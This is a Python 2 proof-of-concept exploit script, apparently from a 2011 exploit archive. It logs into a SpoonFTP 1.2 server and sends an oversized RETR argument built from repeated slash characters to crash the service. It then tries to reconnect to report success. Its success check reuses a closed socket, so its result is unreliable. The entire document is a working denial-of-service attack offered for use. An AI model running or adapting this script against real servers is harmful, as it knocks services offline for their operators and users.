#!/usr/bin/python
#
#
#[+]Exploit Title: Exploit Denial of Service SpoonFTP 1.2
#[+]Date: 21\03\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.softpedia.com/progDownload/SpoonFTP-Download-49969.html
#[+]Version: 1.2
#[+]Tested On: WIN-XP SP3 Portuguese Brazil
#[+]CVE: N/A
#
#
#       xxx     xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx
#        xxx   xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx 
#         xxx xxx         xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx                   
#          xxxxx          xxx       xxx      xxx       xxx      xxx       xxx           xxxxxx  
#           xxx           xxx       xxx      xxx       xxx      xxx       xxx          xxxxxxxx  xxxxxxxx  xxxxxxxxx
#         xxxxxx          xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx    xx  xx
#        xxx  xxx         xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx xxxx   xx  xxxxx
#      xxx     xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx   xxx    xxxxxxxx  xx   xx   xx     xx
#     xxx       xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx    xxx     xxxxxx   xx    xx  xxxxxxxxx
#
#Criado por C4SS!0 G0M3S
#E-mail Louredo_@hotmail.com
#Site www.exploit-br.org
#
#



from socket import *
import os
import sys
from time import sleep

if os.name == 'nt':
     os.system("cls")
     os.system("color 4f")
else:
     os.system("clear")

	 
def usage():
     print """
	 
          ===================================================
          ===================================================
          ==========Exploit Denial of Service SpoonFTP=======
          ==========Autor C4SS!0 G0M3S=======================
          ==========E-mail Louredo_@hotmail.com==============
          ==========Site www.exploit-br.org==================
          ===================================================
          ===================================================

"""

if len(sys.argv) !=5:
     usage()
     print "\t\t[-]Usage: %s <Host> <Port> <User> <Pass>" % sys.argv[0]
     print "\t\t[-]Exemple: %s 192.168.1.2 21 admin pass" % sys.argv[0]
     sys.exit(0)

host = sys.argv[1]
porta = int(sys.argv[2])
user = sys.argv[3]
pasw = sys.argv[4]

exploit = "/\\" * (6000/3)
usage()
print "\t\t[+]Connecting to Server "+host+"...\n"
sleep(1)
s = socket(AF_INET,SOCK_STREAM)
try:
     s.connect((host,porta))
     print "\t\t[+]Checking if server is vulnerable\n"
     sleep(1)
     banner = s.recv(2000)
     if banner.find("SpoonFTP V1.2") == -1:
          print "\t\t[+]I'm sorry, server is not vulnerable:(\n"
          sleep(1)
          sys.exit(0x00)
     print "\t\t[+]Making Loging On Server\n"
     sleep(1)
     s.send("USER "+user+"\r\n")
     s.recv(200)
     s.send("PASS "+pasw+"\r\n")
     check = s.recv(2000)
     if check.find("230") == -1:
          print "\t\t[+]Error on Login, Check Your Username or Password\n"
          sleep(1)
          sys.exit(0)
     print "\t\t[+]Sending Exploit...\n"
     sleep(1)
     s.send("RETR "+exploit+"\r\n")
     s.close()
     print "\t\t[+]Submitted Exploit Success\n"
     sleep(1)

     print "\t\t[+]Checking if the exploit works\n"
     sleep(1)
     try:
          so = socket(AF_INET,SOCK_STREAM)
          s.connect((host,porta))
          print "\t\t[+]I'm Sorry, But Not Worked Exploit:(\n"
	  sleep(1)
     except:
          print "\t\t[+]Congratulations, worked with the Exploit Success:)\n"
	  sleep(1)
     
     
except:
     print "\t\t[+]Error connecting to Server\n"
     sleep(1)
